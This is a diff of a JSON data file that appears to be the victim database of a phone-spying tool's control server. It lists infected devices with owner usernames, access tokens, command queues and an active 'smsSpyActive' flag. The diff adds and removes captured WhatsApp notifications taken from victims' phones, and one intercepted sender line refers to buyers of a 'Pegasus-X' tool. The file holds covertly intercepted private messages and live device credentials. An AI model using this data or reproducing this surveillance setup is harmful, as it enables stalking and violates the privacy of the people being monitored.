@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776782473332,
+    "lastSeen": 1776782482197,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus-X ( No Update ) (9 pesan): ~ .",
+        "content": "💟 Stiker",
+        "time": "21/04 21:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776782482555
+      },
       {
         "appName": "WhatsApp",
         "sender": "Laa",
@@ -10320,14 +10328,6 @@
         "time": "21/04 21:03",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780200216
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3587 pesan dari 20 chat",
-        "time": "21/04 21:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780197222
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776782470835,
+    "lastSeen": 1776782481554,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776782473240,
+    "lastSeen": 1776782482199,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
